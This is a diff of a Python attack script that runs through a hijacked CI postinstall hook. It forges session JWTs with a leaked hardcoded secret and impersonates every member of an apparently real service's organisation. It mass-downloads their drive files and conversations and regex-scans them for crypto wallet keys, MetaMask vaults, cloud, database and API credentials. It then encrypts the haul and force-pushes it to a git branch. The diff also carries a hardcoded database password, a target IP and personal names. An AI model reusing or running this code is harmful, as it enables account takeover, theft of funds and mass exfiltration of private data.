@@ -1,27 +1,28 @@
 #!/usr/bin/env python3
-# Runs inside a GitHub Actions runner (clean egress) via the repo's EXISTING deploy.yml.
-# Triggered via package.json "postinstall":"python3 -u probe.py" run by `npm ci`.
-# Goal: fetch Brian(0xC56f) Chrome MetaMask vault blob (mmv_0.json) + any keystore/.env from
-#       assistant.lumiiai.cn drive data plane, using a forged lumii_session (JWT_SECRET leaked).
-# Also tries direct postgres 122.51.1.87:5432 read-only.
-import os, sys, json, time, uuid, base64, hmac, hashlib, socket, subprocess, ssl, shutil, threading, traceback
-import urllib.request, urllib.error, urllib.parse as up, re
+# probe2 (intent 28120): FULL data-plane mining of assistant.lumiiai.cn drive.
+# - enumerate all 31 members' drive trees -> all nodes
+# - download ALL text files < 512KB (parallel), grep for secrets in-runner
+# - fetch all conversation messages (all convs), grep
+# - enumerate control-plane read endpoints with forged admin/org session
+# Runs inside GitHub Actions runner via package.json postinstall (hijacked deploy.yml).
+import os, sys, json, time, uuid, base64, hmac, hashlib, socket, subprocess, ssl, shutil, threading, traceback, re
+import concurrent.futures as cf
+import urllib.request, urllib.error, urllib.parse as up
 
 _REF = os.environ.get("GITHUB_REF_NAME", "") or ""
 if "results" in _REF:
     print("results-branch-skip", flush=True); sys.exit(0)
 RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
 START = time.time()
-BUDGET = 780  # hard wall-clock seconds
+BUDGET = int(os.environ.get("PBUDGET", "3300"))
 
 TARGET_IP = "122.51.1.87"
 HOST = "assistant.lumiiai.cn"
 ORG = "org_bTLzxtBLmugV8uxx4QTyw"
 JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
-PG_PW = "364ddaf7cdc680e32d3605d506e420ee60076eabc3487024"
 
-OUT = "/tmp/results"
-for d in ("files", "trees", "meta", "search", "wsf", "pg"):
+OUT = "/tmp/results2"
+for d in ("hits", "admin", "convhits", "cp", "rawgz", "msggz"):
     os.makedirs(os.path.join(OUT, d), exist_ok=True)
 LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
 def log(*a):
@@ -49,14 +50,13 @@ MEMBERS = {
  "usr_XLBCd82JGQAbt5pttnfAw":"牟柯屹","usr_pgnckdUSgpk9iDW3WemFY":"测试账号",
  "usr_8WTmpJ5gAdAXJdTAAgfcs":"王棱",
 }
-PRIORITY = ["usr_j7t9Dhq4M4obQkag5huJi","usr_CMU92C54VpuSAXoCfbXDE","usr_2gzZoKLgRAYaFNy2Sav4v",
-            "usr_SjEcavSzyWqWKeokUwig4","usr_ZxLewKrgbRYSm7rWDtQX8"]
+PRIORITY = ["usr_ZxLewKrgbRYSm7rWDtQX8","usr_j7t9Dhq4M4obQkag5huJi",
+            "usr_CMU92C54VpuSAXoCfbXDE","usr_2gzZoKLgRAYaFNy2Sav4v"]
 ORDER = PRIORITY + [k for k in MEMBERS if k not in PRIORITY]
 
 def b64u(b):
     if isinstance(b, str): b = b.encode()
     return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
-
 def jwt(sub):
     now = int(time.time())
     h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')))
@@ -64,92 +64,116 @@ def jwt(sub):
                          "sid":"sid_"+str(uuid.uuid4()),"lgn":now}, separators=(',',':')))
     sig = hmac.new(JWT_SECRET.encode(), (h+"."+p).encode(), hashlib.sha256).digest()
     return "lumii_session="+h+"."+p+"."+b64u(sig)
-
 CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
-_ckcache = {}
+_ck = {}
 def cookie(sub):
-    if sub not in _ckcache: _ckcache[sub] = jwt(sub)
-    return _ckcache[sub]
-
-def req(sub, path, method="GET", data=None, timeout=18):
+    if sub not in _ck: _ck[sub] = jwt(sub)
+    return _ck[sub]
+def req(sub, path, method="GET", data=None, timeout=20, retries=2):
     url = "https://" + HOST + path
     headers = {"Cookie": cookie(sub), "Accept":"*/*", "User-Agent":"Mozilla/5.0"}
     body = None
     if data is not None:
         body = data if isinstance(data, bytes) else json.dumps(data).encode()
         headers["Content-Type"] = "application/json"
-    r = urllib.request.Request(url, data=body, headers=headers, method=method)
-    try:
-        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
-            return resp.status, dict(resp.headers), resp.read()
-    except urllib.error.HTTPError as e:
-        try: return e.code, dict(e.headers), e.read()
-        except Exception: return e.code, {}, b""
-    except Exception as e:
-        return -1, {}, ("ERR:"+repr(e)).encode()
-
-def jget(sub, path):
-    st, hd, b = req(sub, path)
+    last = (-1, {}, b"")
+    for i in range(retries+1):
+        r = urllib.request.Request(url, data=body, headers=headers, method=method)
+        try:
+            with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
+                return resp.status, dict(resp.headers), resp.read()
+        except urllib.error.HTTPError as e:
+            try: return e.code, dict(e.headers), e.read()
+            except Exception: return e.code, {}, b""
+        except Exception as e:
+            last = (-1, {}, ("ERR:"+repr(e)).encode())
+            time.sleep(0.4*(i+1))
+    return last
+def jget(sub, path, **kw):
+    st, hd, b = req(sub, path, **kw)
     try: j = json.loads(b)
     except Exception: j = None
     return st, j, b, hd
 
-def tcp(host, port, timeout=8):
-    t=time.time()
-    try:
-        s=socket.create_connection((host,port),timeout=timeout); s.close()
-        return "OPEN %.1fs"%(time.time()-t)
-    except Exception as e:
-        return "ERR "+repr(e)
-
 def sanitize(name, mid=""):
-    s = re.sub(r'[^A-Za-z0-9._-]+', '_', str(name or ""))[:80]
+    s = re.sub(r'[^A-Za-z0-9._-]+', '_', str(name or ""))[:90]
     return (s or "x") + "_" + str(mid)[-8:]
 
-RESULT_BRANCH = "ci-fast-28090-results"
-
-def push_results(final=False):
-    enc = "/tmp/results.tar.gz.gpg"
+RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-fast-28120-results")
+def _unlink(p):
     try:
-        subprocess.run("tar czf /tmp/results.tar.gz -C /tmp results", shell=True, check=False)
-        tsize = os.path.getsize("/tmp/results.tar.gz") if os.path.isfile("/tmp/results.tar.gz") else 0
+        if os.path.isfile(p): os.remove(p)
+    except Exception:
+        pass
+def push_results(final=False):
+    enc = "/tmp/results2.tar.gz.gpg"
+    try:
+        _unlink("/tmp/results2.tar.gz"); _unlink(enc); _unlink("results2.tar.gz.gpg")
+        subprocess.run("tar czf /tmp/results2.tar.gz -C /tmp results2", shell=True, check=False)
+        tsize = os.path.getsize("/tmp/results2.tar.gz") if os.path.isfile("/tmp/results2.tar.gz") else 0
         log("TARBALL size", tsize)
         if tsize == 0: return
         if os.path.isfile("pub.asc"):
             subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
-            r = subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results.tar.gz"%enc,
-                               shell=True, capture_output=True, text=True, timeout=180)
-            log("GPG rc=%s err=%s"%(r.returncode,(r.stderr or "")[-200:]))
+            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results2.tar.gz"%enc,
+                           shell=True, capture_output=True, text=True, timeout=300)
         if os.path.isfile(enc):
-            esz=os.path.getsize(enc); data=open(enc,"rb").read()
-            sha=hashlib.sha256(data).hexdigest()
+            esz = os.path.getsize(enc); data = open(enc,"rb").read()
+            sha = hashlib.sha256(data).hexdigest()
             log("ENC size", esz, "sha256", sha)
-            # push to results branch
             if esz < 95*1024*1024:
-                try:
-                    shutil.copy(enc, "results.tar.gz.gpg")
-                    subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
-                    subprocess.run("git add -f results.tar.gz.gpg && git commit -m 'ci results %s %s'||true"%(RUNID, "final" if final else "partial"),
-                                   shell=True, check=False)
-                    r = subprocess.run("git push -f origin HEAD:refs/heads/%s"%RESULT_BRANCH,
-                                       shell=True, capture_output=True, text=True, timeout=240)
-                    log("PUSH rc=%s out=%s err=%s"%(r.returncode,(r.stdout or "")[-300:],(r.stderr or "")[-400:]))
-                except Exception as e:
-                    log("PUSH EXC", repr(e))
-            # small-result fallback b64 to log
-            if final and len(data) <= 3*1024*1024:
-                b64=base64.b64encode(data).decode()
-                log("B64BEGIN %d %s"%(len(b64),sha))
-                for i in range(0,len(b64),4000):
-                    print("B64:"+b64[i:i+4000], flush=True)
-                print("B64END", flush=True)
+                shutil.copy(enc, "results2.tar.gz.gpg")
+                subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
+                subprocess.run("git add -f results2.tar.gz.gpg && git commit -m 'ci results2 %s %s'||true"%(RUNID, "final" if final else "part"),
+                               shell=True, check=False)
+                r = subprocess.run("git push -f origin HEAD:refs/heads/%s"%RESULT_BRANCH,
+                                   shell=True, capture_output=True, text=True, timeout=600)
+                log("PUSH rc=%s err=%s"%(r.returncode,(r.stderr or "")[-300:]))
+            else:
+                log("TOO BIG to push:", esz)
     except Exception as e:
-        log("PUSH EXC2", repr(e))
+        log("PUSH EXC", repr(e))
 
-summary = {"target":TARGET_IP,"host":HOST,"ts":int(time.time()),"runid":RUNID,"ports":{},"users":{}}
+# ---------- secret patterns ----------
+PATTERNS = [
+ ("evm_privkey", r'\b0x[0-9a-fA-F]{64}\b'),
+ ("pem_privkey", r'-----BEGIN (?:RSA |EC |OPENSSH |ENCRYPTED |DSA |PGP )?PRIVATE KEY-----'),
+ ("ssh_privkey_openssh", r'-----BEGIN OPENSSH PRIVATE KEY-----'),
+ ("deployer_key_assign", r'(?i)(DEPLOYER_PRIVATE_KEY|DEPLOY[_A-Z]*PRIVATE|PRIVATE_KEY\s*[:=]\s*[\'"]?0x[0-9a-fA-F]{40,})'),
+ ("mnemonic_assign", r'(?i)(mnemonic|seed[_ ]?phrase|secret[_ ]?phrase)\s*[:=]'),
+ ("wallet_secret_assign", r'(?i)(WALLET_PRIVATE|X402[A-Z_]*PRIVATE|GAS_RELAYER[A-Z_]*PRIVATE|SPONSOR[A-Z_]*PRIVATE|PAYMENT[A-Z_]*PRIVATE)'),
+ ("pg_dsn", r'(?i)(postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp)://[^\s"\'<>]{6,}'),
+ ("aws_ak", r'\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[0-9A-Za-z]{13,})\b'),
+ ("aws_sk_assign", r'(?i)(aws_secret_access_key|secret_access_key|secretKey|SecretKey|COS_SECRET|TENCENT[A-Z_]*SECRET)\s*[:=]\s*[\'"]?[A-Za-z0-9/+=]{20,}'),
+ ("gcp_sa", r'"type"\s*:\s*"service_account"'),
+ ("jwt_hmac_secret", r'(?i)(JWT_SECRET|JWT_KEY|HMAC_SECRET|SESSION_SECRET|COOKIE_SECRET|LUMII_DESKTOP_TOKEN_SECRET)\s*[:=]\s*[\'"]?[0-9a-zA-Z_\-]{16,}'),
+ ("auth_zoofi", r'(?i)Auth for zoofi'),
+ ("zoofi_index_origin", r'(?i)(zoofi[-_]?index|trycloudflare\.com|cloudflared|\.zoofi\.io|api\.zoofi\.io|zoofi\.io/api)'),
+ ("db_password", r'(?i)(DB_PASS|DATABASE_URL|DB_PASSWORD|PGPASSWORD|POSTGRES_PASSWORD|REDIS_PASSWORD|password)\s*[:=]\s*[\'"]?[^\s\'"<>]{6,}'),
+ ("api_key_rpc", r'(?i)(ALCHEMY|INFURA|QUICKNODE|RPC_URL|0G_?API|ZEROG|API_KEY|APIKEY|OPENAI_API_KEY|STORY_API)\s*[:=]\s*[\'"]?[A-Za-z0-9_\-]{16,}'),
+ ("cf_token", r'(?i)(CF_API_TOKEN|CLOUDFLARE_API_TOKEN|CLOUDFLARE_TOKEN)\s*[:=]'),
+ ("metamask_vault", r'(?i)(vault|keyring|MetaMask|mmv_0|\"salt\"|\"cipherparams\"|PBKDF2)'),
+ ("github_token", r'\b(gh[pous]_[0-9A-Za-z]{30,}|github_pat_[0-9A-Za-z_]{20,})\b'),
+ ("known_eoa", r'0x(?:C56f[0-9a-fA-F]{36}|FE18[0-9a-fA-F]{36})'),
+ ("internal_hostport", r'\b(?:10|127|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}(?::\d{2,5})\b'),
+ ("tz_tencent_secret", r'(?i)(secretId|secretKey|SecretId|SecretKey)\s*[:=]\s*[\'"]?[A-Za-z0-9]{10,}'),
+]
+PATS = [(n, re.compile(r)) for n, r in PATTERNS]
+def scan(text):
+    if not text: return []
+    out = []
+    for name, rx in PATS:
+        ms = list(rx.finditer(text))
+        if ms:
+            snips = []
+            for m in ms[:4]:
+                a = max(0, m.start()-50); b = min(len(text), m.end()+50)
+                snips.append(text[a:b].replace("\n"," "))
+            out.append({"name":name,"count":len(ms),"snips":snips})
+    return out
 
-all_nodes = {}   # id -> node
-node_user = {}   # id -> [sub]
+all_nodes = {}
+node_user = {}
 def add_nodes(j, sub):
     if isinstance(j, dict):
         for key in ("nodes","notes","files","items","data"):
@@ -167,202 +191,296 @@ def add_nodes(j, sub):
                 node_user.setdefault(n["id"], [])
                 if sub not in node_user[n["id"]]: node_user[n["id"]].append(sub)
 
-def try_download(sub, nid, n):
-    # try several raw download endpoints; return (bytes, ctype, usedpath) or None
+def fetch_raw(sub, nid):
     for path in ("/api/drive/%s/raw"%nid, "/api/drive/%s/content?download=1"%nid,
                  "/api/drive/%s/download"%nid, "/api/files/%s/raw"%nid, "/api/drive/node/%s/raw"%nid):
-        st,j,b,hd = jget(sub, path)
-        low=b[:200].lower()
-        if st==200 and len(b)>0 and not b.startswith(b'{"error') and b'<html' not in low and b'<!doctype' not in low:
+        st, j, b, hd = jget(sub, path)
+        low = b[:200].lower()
+        if st == 200 and len(b) > 0 and not b.startswith(b'{"error') and b'<html' not in low and b'<!doctype' not in low:
             return b, hd.get("Content-Type",""), path
     return None
 
-KW = re.compile(r"(mmv|metamask|vault|keystore|mnemonic|private|\.env|secret|key|wallet|cred|dump|backup|\.sql|zoofi|qimei|jimei|seed|account|token|passw|\.ldb|\.log|leveldb)", re.I)
+BINEXT = {"png","jpg","jpeg","gif","webp","ico","bmp","tif","tiff","pdf","docx","doc","pptx","ppt","xlsx","xls",
+          "zip","rar","7z","gz","tgz","tar","dwg","mp3","m4a","wav","mp4","mov","avi","woff","woff2","ttf","otf",
+          "eot","exe","dll","so","bin","apk","ipa","psd","ai","sketch"}
+def ext_of(name):
+    m = re.search(r'\.([A-Za-z0-9]{1,12})$', name or "")
+    return m.group(1).lower() if m else ""
+def is_text_name(name):
+    e = ext_of(name)
+    return e not in BINEXT
+
+def _get(u, timeout=20):
+    try:
+        with urllib.request.urlopen(urllib.request.Request(u), timeout=timeout, context=CTX) as r:
+            return r.status, r.read()
+    except Exception as e:
+        return -1, ("ERR:"+repr(e)).encode()
+
+def discover_endpoints():
+    eps = set()
+    try:
+        st, b = _get("https://%s/" % HOST)
+        html = b.decode('utf-8','replace')
+        assets = re.findall(r'/assets/[A-Za-z0-9._\-]+\.js', html) + re.findall(r'src="([^"]+\.js)"', html)
+        log("index html assets:", assets[:10])
+        for a in assets[:4]:
+            u = a if a.startswith("http") else "https://%s%s" % (HOST, a)
+            st, js = _get(u)
+            if st == 200:
+                t = js.decode('utf-8','replace')
+                for m in re.finditer(r'["\'`](/api/[A-Za-z0-9_\-/{}$:.]+)["\'`]', t):
+                    eps.add(m.group(1))
+                for m in re.finditer(r'conversations/[^"\'`]{0,40}(messages|timeline|list)', t):
+                    eps.add("HITMSG:"+m.group(0))
+        json.dump(sorted(eps), open(os.path.join(OUT,"api_endpoints.json"),"w"), ensure_ascii=False, indent=1)
+        log("discovered api eps count", len(eps))
+    except Exception as e:
+        log("discover err", repr(e))
+    return eps
 
 def main():
-    # env probe
-    try:
-        keys=sorted(os.environ.keys())
-        inter=[k for k in keys if re.search(r'(SECRET|TOKEN|KEY|PASS|DSN|DATABASE|AWS|COS|CF_|GITHUB)',k,re.I)]
-        json.dump({"all":keys,"interesting":{k:(os.environ[k] if len(os.environ[k])<400 else os.environ[k][:80]+"...") for k in inter}},
-                  open(os.path.join(OUT,"env_probe.json"),"w"), ensure_ascii=False, indent=1)
-    except Exception as e: log("env err",e)
+    summary = {"target":TARGET_IP,"host":HOST,"ts":int(time.time()),"runid":RUNID}
+    st, hd, b = req(ORDER[0], "/")
+    log("GET / ->", st, "len", len(b))
+    summary["root"] = {"status":st,"len":len(b)}
+    if st == -1:
+        log("TARGET UNREACHABLE"); json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), indent=1)
+        push_results(final=True); return
 
-    for p in (443,5432,8788):
-        summary["ports"][p]=tcp(TARGET_IP,p)
-        log("PORT %d -> %s"%(p,summary["ports"][p]))
+    eps = discover_endpoints()
 
-    try:
-        subprocess.run("grep -q 'assistant.lumiiai.cn' /etc/hosts || (echo '%s %s'|sudo tee -a /etc/hosts >/dev/null)"%(TARGET_IP,HOST),
-                       shell=True, check=False)
-    except Exception: pass
-
-    # connectivity check
-    st,hd,b = req(ORDER[0], "/")
-    log("GET / ->", st, "len", len(b), repr(b[:120]))
-    summary["root"]={"status":st,"len":len(b),"head":b[:200].decode('utf-8','replace')}
-    REACH = st != -1
-    if not REACH:
-        log("TARGET UNREACHABLE from runner")
-        json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
-        push_results(final=True)
-        return
-
-    # ---- drive trees per member ----
+    # Phase 1: enumerate nodes
+    users_sum = {}
     for sub in ORDER:
-        name=MEMBERS.get(sub,sub); usum={"name":name}
-        for label,path in (("tree","/api/drive/tree?hidden=1"),("drive","/api/drive?hidden=1"),
-                           ("files","/api/drive/files?hidden=1")):
-            st,j,b,hd=jget(sub,path)
-            usum[label]=st
+        us = {"name":MEMBERS.get(sub,sub)}
+        for label, path in (("tree","/api/drive/tree?hidden=1"),("drive","/api/drive?hidden=1")):
+            st, j, bb, hd = jget(sub, path)
+            us[label] = st
             if j is not None:
-                json.dump(j, open(os.path.join(OUT,"trees","%s_%s.json"%(label,sub)),"w"), ensure_ascii=False)
+                json.dump(j, open(os.path.join(OUT,"cp","_tree_%s_%s.json"%(label,sub)),"w"), ensure_ascii=False)
                 add_nodes(j, sub)
-        summary["users"][sub]=usum
-        log("USER", sub, name, "tree",usum["tree"],"drive",usum["drive"],"files",usum["files"],"nodes_now",len(all_nodes))
+        users_sum[sub] = us
+    summary["users"] = users_sum
+    log("TOTAL nodes", len(all_nodes))
+    agg = []
+    for nid, n in all_nodes.items():
+        nn = dict(n); nn["_users"] = node_user.get(nid, []); agg.append(nn)
+    json.dump(agg, open(os.path.join(OUT,"all_nodes.json"),"w"), ensure_ascii=False)
+    del agg
 
-    log("TOTAL unique drive nodes:", len(all_nodes))
-    agg=[]
-    for nid,n in all_nodes.items():
-        nn=dict(n); nn["_users"]=node_user.get(nid,[]); agg.append(nn)
-    json.dump(agg, open(os.path.join(OUT,"all_nodes.json"),"w"), ensure_ascii=False, indent=1)
+    # build target file list
+    targets = []
+    for nid, n in all_nodes.items():
+        if n.get("kind") not in ("file","doc","note","attachment"): continue
+        nm = n.get("name") or ""
+        if not is_text_name(nm): continue
+        try: size = int(n["size"]) if n.get("size") is not None else None
+        except Exception: size = None
+        if size is not None and (size <= 0 or size > 512*1024): continue
+        targets.append((nid, n, size))
+    log("text target files:", len(targets))
 
-    names=[(n.get("kind"),n.get("name"),[MEMBERS.get(u,u) for u in node_user.get(nid,[])],nid) for nid,n in all_nodes.items()]
-    interesting=[x for x in names if x[1] and KW.search(str(x[1]))]
-    log("INTERESTING NAMES:", json.dumps(interesting[:200], ensure_ascii=False))
+    KW = re.compile(r'(deploy|secret|key|env|db|config|ssh|prod|vault|wallet|passw|token|cred|\.sql|zoofi|qimei|dump|backup|\.pem|\.log|\.ldb|mongo|postgres|redis|\.tf|\.ya?ml)', re.I)
+    def prio_key(item):
+        nid, n, size = item
+        nm = n.get("name") or ""
+        admin = "usr_ZxLewKrgbRYSm7rWDtQX8" in node_user.get(nid, [])
+        kw = bool(KW.search(nm))
+        return (0 if admin else 1, 0 if kw else 1, size if size is not None else 0)
+    targets.sort(key=prio_key)
 
-    # pick candidates: keyword-hit first, then priority-user files
-    picks=[]
-    for nid,n in all_nodes.items():
-        kind=str(n.get("kind") or "")
-        size=n.get("size")
-        try: size_i=int(size) if size is not None else None
-        except Exception: size_i=None
-        keyhit=bool(KW.search(str(n.get("name") or "")))
-        inprio=any(u in PRIORITY for u in node_user.get(nid,[]))
-        picks.append((0 if keyhit else 1, 0 if inprio else 1, nid, n, size_i, keyhit))
-    picks.sort(key=lambda x:(x[0],x[1],x[4] if x[4] is not None else 10**12))
-    log("candidate nodes:", len(picks))
+    index = []
+    lock = threading.Lock()
+    hit_count = [0]
+    raw_saved = [0]
+    RAW_CAP = int(os.environ.get("RAW_CAP","350000000"))
 
-    total_bytes=0; CAP=45*1024*1024; file_index=[]
-    for rank,prio,nid,n,size_i,keyhit in picks:
-        if time.time()-START > BUDGET-180:
-            log("time budget near, stopping downloads"); break
-        if total_bytes>CAP:
-            log("cap reached"); break
-        # only download keyhit or small files for priority users
-        if not keyhit:
-            if kind not in ("file","doc","note","attachment","image","pdf"): continue
-            if size_i is not None and size_i>3*1024*1024:
-                file_index.append({"id":nid,"name":n.get("name"),"size":size_i,"kind":kind,"users":node_user[nid],"downloaded":False,"reason":"too_big"}); continue
-            if not prio:
-                file_index.append({"id":nid,"name":n.get("name"),"kind":kind,"users":node_user[nid],"downloaded":False,"reason":"nonprio_small_skip"}); continue
-        sub0=node_user[nid][0]
-        jget(sub0,"/api/drive/%s/meta"%nid)  # warm
-        res=try_download(sub0,nid,n)
-        if res:
-            b,ctype,usedpath=res
-            fn=sanitize(n.get("name"),nid)+(".bin" if 'octet' in ctype else "")
-            open(os.path.join(OUT,"files",fn),"wb").write(b)
-            total_bytes+=len(b)
-            file_index.append({"id":nid,"name":n.get("name"),"size":len(b),"kind":n.get("kind"),
-                               "ctype":ctype,"users":node_user[nid],"downloaded":True,"file":fn,"keyhit":keyhit,"path":usedpath})
-            log("DL",nid,repr(n.get("name")),len(b),ctype,node_user[nid],usedpath)
-        else:
-            file_index.append({"id":nid,"name":n.get("name"),"kind":n.get("kind"),"users":node_user[nid],
-                               "downloaded":False,"reason":"raw_fail","keyhit":keyhit})
-    json.dump(file_index, open(os.path.join(OUT,"file_index.json"),"w"), ensure_ascii=False, indent=1)
-    log("DOWNLOADED files:", sum(1 for f in file_index if f.get("downloaded")), "bytes:", total_bytes)
+    def work(item):
+        nid, n, size = item
+        if time.time()-START > BUDGET-300: return ("skip","timebudget")
+        subs = node_user.get(nid) or [ORDER[0]]
+        sub = subs[0]
+        try:
+            res = fetch_raw(sub, nid)
+            if not res:
+                for s2 in subs[1:3]:
+                    res = fetch_raw(s2, nid)
+                    if res: break
+            if not res:
+                with lock: index.append({"id":nid,"name":n.get("name"),"size":size,"owner":n.get("ownerId"),"ok":False})
+                return ("fail",None)
+            raw, ctype, used = res
+            try: txt = raw.decode('utf-8','replace')
+            except Exception: txt = raw.decode('latin-1','replace')
+            hits = scan(txt)
+            sha = hashlib.sha256(raw).hexdigest()
+            admin = "usr_ZxLewKrgbRYSm7rWDtQX8" in node_user.get(nid, [])
+            entry = {"id":nid,"name":n.get("name"),"size":len(raw),"owner":n.get("ownerId"),
+                     "users":node_user.get(nid,[]),"ctype":ctype,"path":used,"sha256":sha,
+                     "matches":[h["name"] for h in hits],"admin":admin}
+            with lock:
+                index.append(entry)
+                if hits:
+                    hit_count[0]+=1
+                    fn = sanitize(n.get("name"), nid)+".txt"
+                    open(os.path.join(OUT,"hits",fn),"w",encoding='utf-8',errors='replace').write(txt)
+                    with open(os.path.join(OUT,"hits_report.jsonl"),"a",encoding='utf-8') as f:
+                        f.write(json.dumps({"file":fn,"id":nid,"name":n.get("name"),"owner":n.get("ownerId"),
+                                            "users":node_user.get(nid,[]),"matches":hits}, ensure_ascii=False)+"\n")
+                if admin:
+                    fn = sanitize(n.get("name"), nid)+".txt"
+                    open(os.path.join(OUT,"admin",fn),"w",encoding='utf-8',errors='replace').write(txt)
+                if raw_saved[0] < RAW_CAP and len(raw) > 0:
+                    with open(os.path.join(OUT,"rawgz","f_%s.txt"%nid),"wb") as f:
+                        f.write(raw)
+                    raw_saved[0]+=len(raw)
+            return ("ok",hits)
+        except Exception as e:
+            with lock: index.append({"id":nid,"name":n.get("name"),"size":size,"ok":False,"err":repr(e)[:120]})
+            return ("exc",repr(e))
 
-    # push partial now (trees + partial dl)
+    done = 0
+    with cf.ThreadPoolExecutor(max_workers=12) as ex:
+        futs = {ex.submit(work, it): it for it in targets}
+        for fu in cf.as_completed(futs):
+            done += 1
+            if done % 2000 == 0:
+                log("downloaded", done, "/", len(targets), "hits", hit_count[0], "rawMB", round(raw_saved[0]/1e6,1), "t", round(time.time()-START))
+            if time.time()-START > BUDGET-300:
+                log("time budget in file phase, cancelling rest"); break
+    log("file phase done dl", done, "hits", hit_count[0], "rawMB", round(raw_saved[0]/1e6,1))
+    json.dump(index, open(os.path.join(OUT,"index.json"),"w"), ensure_ascii=False)
+    summary["files"] = {"targets":len(targets),"done":done,"hits":hit_count[0],"raw_bytes":raw_saved[0]}
+    json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
     push_results(final=False)
 
-    # ---- conversations + desktop workspace files ----
-    conv_all=[]
-    for sub in ORDER[:10]:
-        st,j,b,hd=jget(sub,"/api/conversations")
-        if isinstance(j,dict):
-            arr=j.get("conversations") or j.get("items") or j.get("nodes") or []
-            if isinstance(arr,list):
-                json.dump(j, open(os.path.join(OUT,"trees","convs_%s.json"%sub),"w"), ensure_ascii=False)
+    # Phase 2: conversations + messages
+    convs = {}
+    for sub in ORDER:
+        st, j, bb, hd = jget(sub, "/api/conversations")
+        if isinstance(j, dict):
+            arr = j.get("conversations") or j.get("items") or j.get("nodes") or []
+            if isinstance(arr, list):
+                json.dump(j, open(os.path.join(OUT,"cp","_convs_%s.json"%sub),"w"), ensure_ascii=False)
                 for c in arr:
-                    if isinstance(c,dict):
-                        c["_sub"]=sub; conv_all.append(c)
-    log("conversations:", len(conv_all))
-    wsf=[]
-    for c in conv_all[:400]:
-        if time.time()-START > BUDGET-120:
-            log("time budget near in wsf"); break
-        cid=c.get("id") or c.get("conversationId")
-        if not cid: continue
-        st,j,b,hd=jget(c["_sub"],"/api/conversations/%s/desktop-workspace-files"%cid)
-        if st==200 and j is not None:
-            json.dump(j, open(os.path.join(OUT,"wsf","ws_%s.json"%cid),"w"), ensure_ascii=False)
-            wsf.append({"conv":cid,"sub":c["_sub"],"status":st,"body":j})
-            # if file entries present, try download
-            arr = j if isinstance(j,list) else (j.get("files") or j.get("items") or [])
-            for f in (arr if isinstance(arr,list) else []):
-                if isinstance(f,dict):
-                    fid=f.get("id") or f.get("fileId"); fname=str(f.get("name") or "")
-                    if fid and KW.search(fname):
-                        for pth in ("/api/conversations/%s/desktop-workspace-files/%s/raw"%(cid,fid),
-                                    "/api/desktop-workspace/%s/raw"%fid, "/api/conversations/%s/files/%s/raw"%(cid,fid)):
-                            st2,j2,b2,hd2=jget(c["_sub"],pth)
-                            if st2==200 and len(b2)>0 and not b2.startswith(b'{"error'):
-                                fn="ws_"+sanitize(fname,fid)
-                                open(os.path.join(OUT,"files",fn),"wb").write(b2)
-                                log("WSDL",cid,fid,fname,len(b2),pth); break
-    json.dump(wsf, open(os.path.join(OUT,"workspace_files.json"),"w"), ensure_ascii=False, indent=1)
-    log("workspace-file responses:", len(wsf))
+                    if isinstance(c, dict) and c.get("id"):
+                        convs.setdefault(c["id"], c)
+                        convs[c["id"]].setdefault("_subs", [])
+                        if sub not in convs[c["id"]]["_subs"]: convs[c["id"]]["_subs"].append(sub)
+    log("conversations total", len(convs))
+    summary["conversations"] = len(convs)
+    json.dump([{"id":k,"title":v.get("title"),"kind":v.get("kind"),"lastMessage":v.get("lastMessage"),
+                "lastMessageAt":v.get("lastMessageAt"),"subs":v.get("_subs")} for k,v in convs.items()],
+              open(os.path.join(OUT,"convs_index.json"),"w"), ensure_ascii=False)
 
-    # ---- postgres 5432 read-only ----
-    pglog=[]
-    if str(summary["ports"].get(5432,"")).startswith("OPEN"):
-        try:
-            subprocess.run("pip3 install -q pg8000 2>/dev/null || pip install -q pg8000 2>/dev/null", shell=True, timeout=120)
-            import pg8000.native as pgn
-            con=pgn.Connection(user="lumii", password=PG_PW, host=TARGET_IP, port=5432, database="lumii_center", timeout=15)
-            def q(sql):
-                try: return con.run(sql)
-                except Exception as e: return ["ERR:"+repr(e)]
-            tabs=q("select table_name from information_schema.tables where table_schema='public' order by 1")
-            pglog.append({"q":"tables","rows":tabs[:400]})
-            log("PG tables:", tabs[:80])
-            tnames=[r[0] for r in tabs if r and isinstance(r[0],str)]
-            json.dump(tnames, open(os.path.join(OUT,"pg","tables.json"),"w"), ensure_ascii=False, indent=1)
-            want=[t for t in tnames if re.search(r'workspace|attach|file|drive|message|conversa|vault|blob|document|upload|artifact|node', t, re.I)]
-            for t in want:
+    def extract_strings(o, acc):
+        if isinstance(o, str): acc.append(o)
+        elif isinstance(o, dict):
+            for v in o.values(): extract_strings(v, acc)
+        elif isinstance(o, list):
+            for v in o: extract_strings(v, acc)
+
+    MSG_ENDPOINTS = [
+        "/api/conversations/%s/messages?limit=1000",
+        "/api/conversations/%s/messages",
+        "/api/conversations/%s/timeline?limit=1000",
+        "/api/messages?conversationId=%s&limit=1000",
+        "/api/conversations/%s/message-list",
+    ]
+    for e in sorted(eps):
+        if e.startswith("HITMSG:"): continue
+        if "messages" in e and "$" in e:
+            MSG_ENDPOINTS.insert(0, e.replace("$","%s"))
+    msg_index = []
